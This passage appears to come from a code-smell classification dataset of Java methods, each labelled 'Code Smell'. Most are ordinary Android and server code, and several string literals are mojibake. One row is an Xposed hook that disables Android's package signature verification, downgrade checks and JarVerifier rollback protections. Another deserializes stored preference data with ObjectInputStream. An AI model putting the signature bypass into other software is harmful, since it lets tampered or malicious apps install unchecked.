        o.value=preferences.getBoolean(o.key,(boolean)o.defaultValue);
      }
      if (o.type == configTypeInt) {
        o.value=preferences.getInt(o.key,(int)o.defaultValue);
      }
      if (o.type == configTypeLong) {
        o.value=preferences.getLong(o.key,(Long)o.defaultValue);
      }
      if (o.type == configTypeFloat) {
        o.value=preferences.getFloat(o.key,(Float)o.defaultValue);
      }
      if (o.type == configTypeString) {
        o.value=preferences.getString(o.key,(String)o.defaultValue);
      }
      if (o.type == configTypeSetInt) {
        Set<String> ss=preferences.getStringSet(o.key,new HashSet<>());
        HashSet<Integer> si=new HashSet<>();
        for (        String s : ss) {
          si.add(Integer.parseInt(s));
        }
        o.value=si;
      }
      if (o.type == configTypeMapIntInt) {
        String cv=preferences.getString(o.key,"""");
        if (cv.length() == 0) {
          o.value=new HashMap<Integer,Integer>();
        }
 else {
          try {
            byte[] data=Base64.decode(cv,Base64.DEFAULT);
            ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(data));
            o.value=(HashMap<Integer,Integer>)ois.readObject();
            if (o.value == null) {
              o.value=new HashMap<Integer,Integer>();
            }
            ois.close();
          }
 catch (          Exception e) {
            o.value=new HashMap<Integer,Integer>();
          }
        }
      }
    }
    if (!configLoaded)     preferences.registerOnSharedPreferenceChangeListener(CloudSettingsHelper.listener);
    for (int a=1; a <= 5; a++) {
      datacenterInfos.add(new DatacenterInfo(a));
    }
    configLoaded=true;
  }
}",1,Code Smell
"@Override public J.Unary visitUnary(J.Unary unary,P p){
  J.Unary u=super.visitUnary(unary,p);
switch (u.getOperator()) {
case PostIncrement:
case PostDecrement:
    u=applyUnaryOperatorBeforeSpace(u,style.getAroundOperators().getUnary());
  break;
case PreIncrement:
case PreDecrement:
case Negative:
case Positive:
case Not:
case Complement:
u=applyUnaryOperatorBeforeSpace(u,style.getAroundOperators().getUnary());
u=applyUnaryOperatorExprSpace(u,style.getAroundOperators().getUnary());
break;
}
return u;
}
",1,Code Smell
"@Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws IllegalAccessException, InvocationTargetException, InstantiationException {
  super.handleLoadPackage(loadPackageParam);
  var checkDowngrade=XposedHelpers.findMethodExactIfExists(""com.android.server.pm.PackageManagerServiceUtils"",loadPackageParam.classLoader,""checkDowngrade"",""com.android.server.pm.parsing.pkg.AndroidPackage"",""android.content.pm.PackageInfoLite"");
  if (checkDowngrade != null) {
    XposedBridge.hookMethod(checkDowngrade,new ReturnConstant(prefs,""prefs_key_system_framework_core_patch_downgr"",null));
  }
  Class<?> signingDetails=getSigningDetails(loadPackageParam.classLoader);
  hookAllMethods(signingDetails,""checkCapability"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      if (prefs.getBoolean(""prefs_key_system_framework_core_patch_digest_creak"",true)) {
        if ((Integer)param.args[1] != 4) {
          param.setResult(true);
        }
      }
    }
  }
);
  hookAllMethods(""android.content.pm.PackageParser"",loadPackageParam.classLoader,""checkCapability"",new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    MethodHookParam param){
      if (prefs.getBoolean(""prefs_key_system_framework_core_patch_auth_creak"",true)) {
        if ((Integer)param.args[1] != 4) {
          param.setResult(true);
        }
      }
    }
  }
);
  findAndHookMethod(""com.android.server.pm.InstallPackageHelper"",loadPackageParam.classLoader,""doesSignatureMatchForPermissions"",String.class,""com.android.server.pm.parsing.pkg.ParsedPackage"",int.class,new XC_MethodHook(){
    @Override protected void afterHookedMethod(    MethodHookParam param){
      if (prefs.getBoolean(""prefs_key_system_framework_core_patch_digest_creak"",true) && prefs.getBoolean(""prefs_key_system_framework_core_patch_use_pre_signature"",false)) {
        if (param.getResult().equals(false)) {
          String pPname=(String)XposedHelpers.callMethod(param.args[1],""getPackageName"");
          if (pPname.contentEquals((String)param.args[0])) {
            param.setResult(true);
          }
        }
      }
    }
  }
);
  var assertMinSignatureSchemeIsValid=XposedHelpers.findMethodExactIfExists(""com.android.server.pm.ScanPackageUtils"",loadPackageParam.classLoader,""assertMinSignatureSchemeIsValid"",""com.android.server.pm.parsing.pkg.AndroidPackage"",int.class);
  if (assertMinSignatureSchemeIsValid != null) {
    XposedBridge.hookMethod(assertMinSignatureSchemeIsValid,new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param){
        if (prefs.getBoolean(""prefs_key_system_framework_core_patch_auth_creak"",true)) {
          param.setResult(null);
        }
      }
    }
);
  }
  Class<?> strictJarVerifier=findClass(""android.util.jar.StrictJarVerifier"",loadPackageParam.classLoader);
  if (strictJarVerifier != null) {
    XposedBridge.hookAllConstructors(strictJarVerifier,new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param){
        if (prefs.getBoolean(""prefs_key_system_framework_core_patch_auth_creak"",true)) {
          XposedHelpers.setBooleanField(param.thisObject,""signatureSchemeRollbackProtectionsEnforced"",false);
        }
      }
    }
);
  }
}",1,Code Smell
"public void updateConfig(CodeLocatorConfig config){
  if (config == null) {
    return;
  }
  if (config.mViewMaxLoopCount > 0) {
    mViewMaxLoopCount=config.mViewMaxLoopCount;
  }
  if (config.mActivityMaxLoopCount > 0) {
    mActivityMaxLoopCount=config.mActivityMaxLoopCount;
  }
  if (config.mSkipSystemTraceCount > 0) {
    mSkipSystemTraceCount=config.mSkipSystemTraceCount;
  }
  if (config.mMaxShowInfoLogCount > 0) {
    mMaxShowInfoLogCount=config.mMaxShowInfoLogCount;
  }
  if (config.mMaxBroadcastTransferLength > 0) {
    mMaxBroadcastTransferLength=config.mMaxBroadcastTransferLength;
  }
  if (config.mEnable != null) {
    mEnable=config.mEnable;
  }
  if (config.mEnableLancetInfo != null) {
    mEnableLancetInfo=config.mEnableLancetInfo;
  }
  mDebug=config.mDebug;
  mLazyInit=config.mLazyInit;
  mEnableHookInflater=config.mEnableHookInflater;
  mFetchConfig=config.mFetchConfig;
  if (config.mViewIgnoreByClazzs != null) {
    mViewIgnoreByClazzs.addAll(config.mViewIgnoreByClazzs);
  }
  if (config.mViewReturnByKeyWords != null) {
    mViewReturnByKeyWords.addAll(config.mViewReturnByKeyWords);
  }
  if (config.mToastIgnoreByClazzs != null) {
    mToastIgnoreByClazzs.addAll(config.mToastIgnoreByClazzs);
  }
  if (config.mPopupIgnoreByClazzs != null) {
    mPopupIgnoreByClazzs.addAll(config.mPopupIgnoreByClazzs);
  }
  if (config.mViewReturnByClazzs != null) {
    mViewReturnByClazzs.addAll(config.mViewReturnByClazzs);
  }
  if (config.mDialogIgnoreByClazzs != null) {
    mDialogIgnoreByClazzs.addAll(config.mDialogIgnoreByClazzs);
  }
  if (config.mDialogReturnByClazzs != null) {
    mDialogReturnByClazzs.addAll(config.mDialogReturnByClazzs);
  }
  if (config.mViewIgnoreByKeyWords != null) {
    mViewIgnoreByKeyWords.addAll(config.mViewIgnoreByKeyWords);
  }
  if (config.mActivityIgnoreByKeyWords != null) {
    mActivityIgnoreByKeyWords.addAll(config.mActivityIgnoreByKeyWords);
  }
  if (config.mDialogIgnoreByKeyWords != null) {
    mDialogIgnoreByKeyWords.addAll(config.mDialogIgnoreByKeyWords);
  }
  if (config.mToastIgnoreByKeyWords != null) {
    mToastIgnoreByKeyWords.addAll(config.mToastIgnoreByKeyWords);
  }
  if (config.mActivityIgnoreByClazzs != null) {
    mActivityIgnoreByClazzs.addAll(config.mActivityIgnoreByClazzs);
  }
  if (config.mPopupIgnoreByKeyWords != null) {
    mPopupIgnoreByKeyWords.addAll(config.mPopupIgnoreByKeyWords);
  }
}",1,Code Smell
"public static void toUpperCaseTypeValues(ObjectNode node){
  if (node == null) {
    return;
  }
  if (node.isObject()) {
    node.fields().forEachRemaining(entry -> {
      JsonNode value=entry.getValue();
      if (value.isObject()) {
        toUpperCaseTypeValues((ObjectNode)value);
      }
 else       if (value.isArray()) {
        ((ArrayNode)value).elements().forEachRemaining(element -> {
          if (element.isObject() || element.isArray()) {
            toUpperCaseTypeValues((ObjectNode)element);
          }
        }
);
      }
 else       if (value.isTextual() && entry.getKey().equals(""type"")) {
        String oldValue=((ObjectNode)node).get(""type"").asText();
        ((ObjectNode)node).put(""type"",oldValue.toUpperCase());
      }
    }
);
  }
 else   if (node.isArray()) {
    node.elements().forEachRemaining(element -> {
      if (element.isObject() || element.isArray()) {
        toUpperCaseTypeValues((ObjectNode)element);
      }
    }
);
  }
}
",1,Code Smell
"@Override public void playStateChanged(int playState){
switch (playState) {
case VideoView.STATE_IDLE:
case VideoView.STATE_PAUSED:
    break;
case VideoView.STATE_PREPARED:
case VideoView.STATE_BUFFERED:
case VideoView.STATE_PLAYING:
  currentLiveChangeSourceTimes=0;
mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
break;
case VideoView.STATE_ERROR:
case VideoView.STATE_PLAYBACK_COMPLETED:
mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
mHandler.post(mConnectTimeoutChangeSourceRun);
break;
case VideoView.STATE_PREPARING:
case VideoView.STATE_BUFFERING:
mHandler.removeCallbacks(mConnectTimeoutChangeSourceRun);
mHandler.postDelayed(mConnectTimeoutChangeSourceRun,(Hawk.get(HawkConfig.LIVE_CONNECT_TIMEOUT,1) + 1) * 5000);
break;
}
}",1,Code Smell
"public static Map<String,Object> transBaseGroupDataAntV(List<ChartViewFieldDTO> xAxisBase,List<ChartViewFieldDTO> xAxis,List<ChartViewFieldDTO> xAxisExt,List<ChartViewFieldDTO> yAxis,ChartViewDTO view,List<String[]> data,boolean isDrill){
  Map<String,Object> map=new HashMap<>();
  List<AxisChartDataAntVDTO> dataList=new ArrayList<>();
  for (int i1=0; i1 < data.size(); i1++) {
    String[] row=data.get(i1);
    StringBuilder a=new StringBuilder();
    if (isDrill) {
      a.append(row[xAxis.size() - 1]);
    }
 else {
      for (int i=0; i < xAxisBase.size(); i++) {
        if (i == xAxisBase.size() - 1) {
          a.append(row[i]);
        }
 else {
          a.append(row[i]).append(""\n"");
        }
      }
    }
    StringBuilder b=new StringBuilder();
    for (int i=xAxisBase.size(); i < xAxisBase.size() + xAxisExt.size(); i++) {
      if (i == xAxisBase.size() + xAxisExt.size() - 1) {
        b.append(row[i]);
      }
 else {
        b.append(row[i]).append(""\n"");
      }
    }
    int size=xAxis.size() + yAxis.size();
    int extSize=view.getExtLabel().size() + view.getExtTooltip().size();
    for (int i=xAxis.size(); i < size - extSize; i++) {
      AxisChartDataAntVDTO axisChartDataDTO=new AxisChartDataAntVDTO();
      axisChartDataDTO.setField(a.toString());
      axisChartDataDTO.setName(a.toString());
      List<ChartDimensionDTO> dimensionList=new ArrayList<>();
      List<ChartQuotaDTO> quotaList=new ArrayList<>();
      for (int j=0; j < xAxis.size(); j++) {
        ChartDimensionDTO chartDimensionDTO=new ChartDimensionDTO();
        chartDimensionDTO.setId(xAxis.get(j).getId());
        chartDimensionDTO.setValue(row[j]);
        dimensionList.add(chartDimensionDTO);
      }
      axisChartDataDTO.setDimensionList(dimensionList);
      int j=i - xAxis.size();
      ChartQuotaDTO chartQuotaDTO=new ChartQuotaDTO();
      chartQuotaDTO.setId(yAxis.get(j).getId());
      quotaList.add(chartQuotaDTO);
      axisChartDataDTO.setQuotaList(quotaList);
      try {
        axisChartDataDTO.setValue(StringUtils.isEmpty(row[i]) ? null : new BigDecimal(row[i]));
      }
 catch (      Exception e) {
        axisChartDataDTO.setValue(new BigDecimal(0));
      }
      axisChartDataDTO.setCategory(b.toString());
      buildDynamicValue(view,axisChartDataDTO,row,size,extSize);
      dataList.add(axisChartDataDTO);
      if (""line"".equals(view.getType())) {
        if (ObjectUtils.isEmpty(xAxisExt)) {
          axisChartDataDTO.setCategory(StringUtils.defaultIfBlank(yAxis.get(j).getChartShowName(),yAxis.get(j).getName()));
        }
 else {
          break;
        }
      }
    }
  }
  map.put(""data"",dataList);
  return map;
}",1,Code Smell
"public String getArtworkUrl(boolean small){
  TLRPC.Document document=getDocument();
  if (document != null) {
    if (""audio/ogg"".equals(document.mime_type)) {
      return null;
    }
    for (int i=0, N=document.attributes.size(); i < N; i++) {
      TLRPC.DocumentAttribute attribute=document.attributes.get(i);
      if (attribute instanceof TLRPC.TL_documentAttributeAudio) {
        if (attribute.voice) {
          return null;
        }
 else {
          String performer=attribute.performer;
          String title=attribute.title;
          if (!TextUtils.isEmpty(performer)) {
            for (            String excludeWord : excludeWords) {
              performer=performer.replace(excludeWord,"" "");
            }
          }
          if (TextUtils.isEmpty(performer) && TextUtils.isEmpty(title)) {
            return null;
          }
          try {
            String query=TextUtils.isEmpty(performer) ? title : performer + "" - "" + title;
            String custom_api=NaConfig.INSTANCE.getCustomArtworkApi().String();
            if (!Objects.equals(custom_api,"""")) {
              return custom_api + URLEncoder.encode(query,""UTF-8"");
            }
            return ""athumb://itunes.apple.com/search?term="" + URLEncoder.encode(query,""UTF-8"") + ""&entity=song&limit=4""+ (small ? ""&s=1"" : """");
          }
 catch (          Exception ignore) {
          }
        }
      }
    }
  }
  return null;
}",1,Code Smell
"@Override protected void onDestroy(){
  isActive=false;
  if (PhotoViewer.getPipInstance() != null) {
    PhotoViewer.getPipInstance().destroyPhotoViewer();
  }
  if (PhotoViewer.hasInstance()) {
    PhotoViewer.getInstance().destroyPhotoViewer();
  }
  if (SecretMediaViewer.hasInstance()) {
    SecretMediaViewer.getInstance().destroyPhotoViewer();
  }
  if (ArticleViewer.hasInstance()) {
    ArticleViewer.getInstance().destroyArticleViewer();
  }
  if (ContentPreviewViewer.hasInstance()) {
    ContentPreviewViewer.getInstance().destroy();
  }
  if (GroupCallActivity.groupCallInstance != null) {
    GroupCallActivity.groupCallInstance.dismissInternal();
  }
  PipRoundVideoView pipRoundVideoView=PipRoundVideoView.getInstance();
  MediaController.getInstance().setBaseActivity(this,false);
  MediaController.getInstance().setFeedbackView(feedbackView,false);
  if (pipRoundVideoView != null) {
    pipRoundVideoView.close(false);
  }
  Theme.destroyResources();
  EmbedBottomSheet embedBottomSheet=EmbedBottomSheet.getInstance();
  if (embedBottomSheet != null) {
    embedBottomSheet.destroy();
  }
  ThemeEditorView editorView=ThemeEditorView.getInstance();
  if (editorView != null) {
    editorView.destroy();
  }
  try {
    for (int i=0; i < visibleDialogs.size(); ++i) {
      Dialog dialog=visibleDialogs.get(i);
      if (dialog.isShowing()) {
        visibleDialogs.get(i).dismiss();
      }
    }
    visibleDialogs.clear();
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  try {
    if (onGlobalLayoutListener != null) {
      final View view=getWindow().getDecorView().getRootView();
      view.getViewTreeObserver().removeOnGlobalLayoutListener(onGlobalLayoutListener);
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  clearFragments();
  super.onDestroy();
  onFinish();
  FloatingDebugController.onDestroy();
  if (flagSecureReason != null) {
    flagSecureReason.detach();
  }
}",1,Code Smell
"/** 
 * Return a dataset containing the given vectors, scrubbed free from zero vectors and normalized to unit length. Note: This only scrubs and normalizes for dot product similarity.
 */
public static DataSet getScrubbedDataSet(String pathStr,VectorSimilarityFunction similarityFunction,List<VectorFloat<?>> baseVectors,List<VectorFloat<?>> queryVectors,List<Set<Integer>> groundTruth){
  if (similarityFunction == VectorSimilarityFunction.EUCLIDEAN) {
    return new DataSet(pathStr,similarityFunction,baseVectors,queryVectors,groundTruth);
  }
  List<VectorFloat<?>> scrubbedBaseVectors;
  List<VectorFloat<?>> scrubbedQueryVectors;
  List<HashSet<Integer>> gtSet;
  scrubbedBaseVectors=new ArrayList<>(baseVectors.size());
  scrubbedQueryVectors=new ArrayList<>(queryVectors.size());
  gtSet=new ArrayList<>(groundTruth.size());
  Map<Integer,Integer> rawToScrubbed=new HashMap<>();
{
    int j=0;
    for (int i=0; i < baseVectors.size(); i++) {
      VectorFloat<?> v=baseVectors.get(i);
      if (Math.abs(normOf(v)) > 1e-5) {
        scrubbedBaseVectors.add(v);
        rawToScrubbed.put(i,j++);
      }
    }
  }
  for (int i=0; i < queryVectors.size(); i++) {
    VectorFloat<?> v=queryVectors.get(i);
    if (Math.abs(normOf(v)) > 1e-5) {
      scrubbedQueryVectors.add(v);
      var gt=new HashSet<Integer>();
      for (      int j : groundTruth.get(i)) {
        gt.add(rawToScrubbed.get(j));
      }
      gtSet.add(gt);
    }
  }
  if (similarityFunction == VectorSimilarityFunction.DOT_PRODUCT) {
    if (Math.abs(normOf(baseVectors.get(0)) - 1.0) > 1e-5) {
      normalizeAll(scrubbedBaseVectors);
      normalizeAll(scrubbedQueryVectors);
    }
  }
  assert scrubbedQueryVectors.size() == gtSet.size();
  return new DataSet(pathStr,similarityFunction,scrubbedBaseVectors,scrubbedQueryVectors,gtSet);
}",1,Code Smell
"public void loadPeerSettings(TLRPC.User currentUser,TLRPC.Chat currentChat){
  if (currentUser == null && currentChat == null) {
    return;
  }
  long dialogId;
  if (currentUser != null) {
    dialogId=currentUser.id;
  }
 else {
    dialogId=-currentChat.id;
  }
  if (loadingPeerSettings.indexOfKey(dialogId) >= 0) {
    return;
  }
  loadingPeerSettings.put(dialogId,true);
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""request spam button for "" + dialogId);
  }
  int vis=notificationsPreferences.getInt(""dialog_bar_vis3"" + dialogId,0);
  if (vis == 1 || vis == 3) {
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""dialog bar already hidden for "" + dialogId);
    }
    return;
  }
  TLRPC.TL_messages_getPeerSettings req=new TLRPC.TL_messages_getPeerSettings();
  if (currentUser != null) {
    req.peer=getInputPeer(currentUser.id);
  }
 else {
    req.peer=getInputPeer(-currentChat.id);
  }
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    loadingPeerSettings.remove(dialogId);
    if (response != null) {
      TLRPC.TL_messages_peerSettings res=(TLRPC.TL_messages_peerSettings)response;
      TLRPC.TL_peerSettings settings=res.settings;
      putUsers(res.users,false);
      putChats(res.chats,false);
      savePeerSettings(dialogId,settings,false);
    }
  }
));
}",1,Code Smell
"public boolean loadItem(GameItem item){
  if (item.getId() == null) {
    return false;
  }
  if (item.getOwnerUid() != this.getPlayer().getUid()) {
    return false;
  }
  ItemExcel excel=GameData.getItemExcelMap().get(item.getItemId());
  if (excel == null) {
    item.setCount(0);
    item.save();
    return false;
  }
  item.setExcel(excel);
  InventoryTab tab=getTabByItemType(item.getExcel().getItemMainType());
  putItem(item,tab);
  if (item.isEquipped() || item.getEquipAvatarExcelId() > 0) {
    GameAvatar avatar=null;
    boolean hasEquipped=false;
    if (item.getEquipAvatarExcelId() > 0) {
      avatar=getPlayer().getAvatars().getAvatarById(item.getEquipAvatarExcelId());
      item.setEquipAvatar(avatar);
      item.save();
    }
 else {
      avatar=getPlayer().getAvatars().getAvatarById(item.getEquipAvatarId());
    }
    if (avatar != null) {
      hasEquipped=avatar.equipItem(item);
    }
    if (!hasEquipped) {
      item.setEquipAvatar(null);
      item.save();
    }
  }
  return true;
}",1,Code Smell
"private int scrollOffsetForQuote(MessageObject object){
  if (TextUtils.isEmpty(highlightMessageQuote) || object == null) {
    if (dummyMessageCell != null) {
      dummyMessageCell.computedGroupCaptionY=0;
      dummyMessageCell.computedCaptionLayout=null;
    }
    return 0;
  }
  int offsetY;
  CharSequence text;
  ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks;
  if (object.getGroupId() != 0) {
    MessageObject.GroupedMessages group=getGroup(object.getGroupId());
    if (dummyMessageCell == null || dummyMessageCell.computedCaptionLayout == null || group == null || group.captionMessage == null) {
      if (dummyMessageCell != null) {
        dummyMessageCell.computedGroupCaptionY=0;
        dummyMessageCell.computedCaptionLayout=null;
      }
      return 0;
    }
    offsetY=dummyMessageCell.computedGroupCaptionY;
    text=group.captionMessage.caption;
    textLayoutBlocks=dummyMessageCell.computedCaptionLayout.textLayoutBlocks;
  }
 else   if (!TextUtils.isEmpty(object.caption) && dummyMessageCell != null && dummyMessageCell.captionLayout != null) {
    offsetY=(int)dummyMessageCell.captionY;
    text=object.caption;
    textLayoutBlocks=dummyMessageCell.captionLayout.textLayoutBlocks;
  }
 else {
    offsetY=0;
    text=object.messageText;
    textLayoutBlocks=object.textLayoutBlocks;
    if (dummyMessageCell != null && dummyMessageCell.linkPreviewAbove) {
      offsetY+=dummyMessageCell.linkPreviewHeight + AndroidUtilities.dp(10);
    }
  }
  if (dummyMessageCell != null) {
    dummyMessageCell.computedGroupCaptionY=0;
    dummyMessageCell.computedCaptionLayout=null;
  }
  if (textLayoutBlocks == null || text == null) {
    return 0;
  }
  int index=MessageObject.findQuoteStart(text.toString(),highlightMessageQuote,highlightMessageQuoteOffset);
  if (index < 0) {
    return 0;
  }
  for (int i=0; i < textLayoutBlocks.size(); ++i) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(i);
    StaticLayout layout=block.textLayout;
    String layoutText=layout.getText().toString();
    if (index > block.charactersOffset) {
      final float y;
      if (index - block.charactersOffset > layoutText.length() - 1) {
        y=offsetY + (int)(block.textYOffset + block.padTop + block.height);
      }
 else {
        y=offsetY + block.textYOffset + block.padTop+ layout.getLineTop(layout.getLineForOffset(index - block.charactersOffset));
      }
      if (y > AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f)) {
        return (int)(y - AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f));
      }
      return 0;
    }
  }
  return 0;
}",1,Code Smell
"public static Boolean toBoolean(Object b){
  if (b instanceof Boolean) {
    return (Boolean)b;
  }
 else   if (b == null) {
    return null;
  }
  if (b instanceof Number) {
    int n=((Number)b).intValue();
    if (n == 1) {
      return Boolean.TRUE;
    }
 else     if (n == 0) {
      return Boolean.FALSE;
    }
    throw new IllegalArgumentException(""Can not support convert: \"""" + b + ""\"" to boolean."");
  }
  if (b instanceof String) {
    String s=b.toString();
    if (""true"".equalsIgnoreCase(s) || ""1"".equals(s)) {
      return Boolean.TRUE;
    }
 else     if (""false"".equalsIgnoreCase(s) || ""0"".equals(s)) {
      return Boolean.FALSE;
    }
  }
  return (Boolean)b;
}",1,Code Smell
"@Override public String homeContent(boolean filter){
  try {
    String url=siteUrl + ""/xgapp.php/v1/nav?token="";
    JSONObject jsonObject=new JSONObject(OkHttpUtil.string(url,getHeaders(url)));
    JSONArray jsonArray=jsonObject.getJSONArray(""data"");
    JSONArray classes=new JSONArray();
    JSONObject filterConfig=new JSONObject();
    for (int i=0; i < jsonArray.length(); i++) {
      JSONObject jObj=jsonArray.getJSONObject(i);
      String typeName=jObj.getString(""type_name"");
      if (typeName.equals(""鐢佃鐩存挱""))       continue;
      String typeId=jObj.getString(""type_id"");
      JSONObject newCls=new JSONObject();
      newCls.put(""type_id"",typeId);
      newCls.put(""type_name"",typeName);
      classes.put(newCls);
      try {
        JSONObject typeExtend=jObj.getJSONObject(""type_extend"");
        Iterator<String> typeExtendKeys=typeExtend.keys();
        JSONArray extendsAll=new JSONArray();
        while (typeExtendKeys.hasNext()) {
          String typeExtendKey=typeExtendKeys.next();
          String typeExtendName=null;
switch (typeExtendKey) {
case ""class"":
            typeExtendName=""绫诲瀷"";
          break;
case ""area"":
        typeExtendName=""鍦板尯"";
      break;
case ""lang"":
    typeExtendName=""璇█"";
  break;
case ""year"":
typeExtendName=""骞翠唬"";
break;
}
if (typeExtendName == null) {
SpiderDebug.log(typeExtendKey);
continue;
}
String typeExtendStr=typeExtend.getString(typeExtendKey);
if (typeExtendStr.trim().length() == 0) continue;
String[] newTypeExtendKeys=typeExtendStr.split("","");
JSONObject newTypeExtend=new JSONObject();
newTypeExtend.put(""key"",typeExtendKey);
newTypeExtend.put(""name"",typeExtendName);
JSONArray newTypeExtendKV=new JSONArray();
{
JSONObject kvAll=new JSONObject();
kvAll.put(""n"",""鍏ㄩ儴"");
kvAll.put(""v"","""");
newTypeExtendKV.put(kvAll);
}
for (String k : newTypeExtendKeys) {
if (typeExtendName.equals(""浼︾悊"")) continue;
JSONObject kv=new JSONObject();
kv.put(""n"",k);
kv.put(""v"",k);
newTypeExtendKV.put(kv);
}
newTypeExtend.put(""value"",newTypeExtendKV);
extendsAll.put(newTypeExtend);
}
filterConfig.put(typeId,extendsAll);
}
 catch (Exception e) {
SpiderDebug.log(e);
}
}
JSONObject result=new JSONObject();
result.put(""class"",classes);
if (filter) {
result.put(""filters"",filterConfig);
}
return result.toString();
}
 catch (Exception e) {
SpiderDebug.log(e);
}
return """";
}",1,Code Smell
"public static List<MovieSort.SortData> adjustSort(String sourceKey,List<MovieSort.SortData> list,boolean withMy){
  List<MovieSort.SortData> data=new ArrayList<>();
  if (sourceKey != null) {
    SourceBean sb=ApiConfig.get().getSource(sourceKey);
    ArrayList<String> categories=sb.getCategories();
    if (!categories.isEmpty()) {
      for (      String cate : categories) {
        for (        MovieSort.SortData sortData : list) {
          if (sortData.name.equals(cate)) {
            if (sortData.filters == null)             sortData.filters=new ArrayList<>();
            data.add(sortData);
          }
        }
      }
    }
 else {
      for (      MovieSort.SortData sortData : list) {
        if (sortData.filters == null)         sortData.filters=new ArrayList<>();
        data.add(sortData);
      }
    }
  }
  if (withMy)   data.add(0,new MovieSort.SortData(""my0"",""鎴戠殑""));
  Collections.sort(data);
  return data;
}",1,Code Smell
"/** 
 * Get un-balanced group info
 * @param sBuilder
 * @return
 */
private void getUnbalanceGroupInfo(StringBuilder sBuilder){
  ConsumerInfoHolder consumerHolder=master.getConsumerHolder();
  BrokerRunManager brokerRunManager=master.getBrokerRunManager();
  Map<String,Map<String,Map<String,Partition>>> currentSubInfoMap=master.getCurrentSubInfoMap();
  int currPartSize=0;
  Set<String> topicSet;
  List<Partition> partList;
  List<String> consumerIdList;
  Map<String,Partition> topicSubInfoMap;
  Map<String,Map<String,Partition>> consumerSubInfoMap;
  List<String> groupList=consumerHolder.getAllServerBalanceGroups();
  for (  String group : groupList) {
    if (group == null) {
      continue;
    }
    topicSet=consumerHolder.getGroupTopicSet(group);
    for (    String topic : topicSet) {
      if (topic == null) {
        continue;
      }
      currPartSize=0;
      consumerIdList=consumerHolder.getConsumerIdList(group);
      if (CollectionUtils.isNotEmpty(consumerIdList)) {
        for (        String consumerId : consumerIdList) {
          if (consumerId == null) {
            continue;
          }
          consumerSubInfoMap=currentSubInfoMap.get(consumerId);
          if (consumerSubInfoMap != null) {
            topicSubInfoMap=consumerSubInfoMap.get(topic);
            if (topicSubInfoMap != null) {
              currPartSize+=topicSubInfoMap.size();
            }
          }
        }
      }
      partList=brokerRunManager.getSubBrokerAcceptSubParts(topic);
      if (currPartSize != partList.size()) {
        sBuilder.append(group).append("":"").append(topic).append(""\n"");
      }
    }
  }
}",1,Code Smell
"private void relationalExpression() throws Exception {
  ArithmeticExpression();
  String currentReturnType="""";
  if (jackClasses.dataTypeTransfer.containsKey(expressionReturnType)) {
    currentReturnType=(String)jackClasses.dataTypeTransfer.get(expressionReturnType);
  }
 else {
    currentReturnType=(expressionReturnType + ""|null|Array"");
  }
  while (lexer.PeekNextToken().Token.equals(""="") || lexer.PeekNextToken().Token.equals(""<"") || lexer.PeekNextToken().Token.equals("">"")) {
    String relationSymbol=lexer.PeekNextToken().Token;
    lexer.GetNextToken();
    ArithmeticExpression();
    if (relationSymbol.equals(""="")) {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression not have same type, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""eq\n"");
    }
 else     if (relationSymbol.equals(""<"")) {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""lt\n"");
    }
 else {
      if (!Pattern.compile(currentReturnType).matcher(expressionReturnType).matches()) {
        error(""Error: in class: "" + className + "", two ends of relational expression are not all int, line: ""+ lexer.PeekNextToken().LineNumber);
      }
      vmCodeInput(""gt\n"");
    }
    expressionReturnType=""boolean"";
  }
}
",1,Code Smell
"public void start(){
  new Thread(() -> {
    OkHttpClient client=new OkHttpClient.Builder().build();
    Callback callback=new Callback(){
      @Override public void onFailure(      @NonNull Call call,      @NonNull IOException e){
        countDownLatch.countDown();
      }
      @Override public void onResponse(      @NonNull Call call,      @NonNull Response response) throws IOException {
        Uri url=Uri.parse(response.request().url().toString());
        Utils.log(response.code() + "": "" + url);
        if (response.isSuccessful()) {
          foundUrls.add(url);
        }
        response.close();
        countDownLatch.countDown();
      }
    }
;
    countDownLatch=new CountDownLatch(urls.size());
    for (    Uri url : urls) {
      if (HttpUrl.parse(url.toString()) == null) {
        countDownLatch.countDown();
        continue;
      }
      Request request=new Request.Builder().url(url.toString()).build();
      client.newCall(request).enqueue(callback);
    }
    try {
      countDownLatch.await();
    }
 catch (    InterruptedException e) {
      e.printStackTrace();
    }
    for (    Uri url : urls) {
      if (foundUrls.contains(url)) {
        subtitleUri=url;
        break;
      }
    }
    if (subtitleUri == null) {
      return;
    }
    Utils.log(subtitleUri.toString());
    client=new OkHttpClient.Builder().build();
    Request request=new Request.Builder().url(subtitleUri.toString()).build();
    try (Response response=client.newCall(request).execute()){
      final ResponseBody responseBody=response.body();
      if (responseBody == null || responseBody.contentLength() > 2_000_000) {
        return;
      }
      InputStream inputStream=responseBody.byteStream();
      Uri convertedSubtitleUri=UtilsFeature.convertInputStreamToUTF(activity,subtitleUri,inputStream);
      if (convertedSubtitleUri == null) {
        return;
      }
      activity.runOnUiThread(() -> {
        activity.mPrefs.updateSubtitle(convertedSubtitleUri);
        if (PlayerActivity.player != null) {
          MediaItem mediaItem=PlayerActivity.player.getCurrentMediaItem();
          if (mediaItem != null) {
            MediaItem.SubtitleConfiguration subtitle=SubtitleUtils.buildSubtitle(activity,convertedSubtitleUri,null,true);
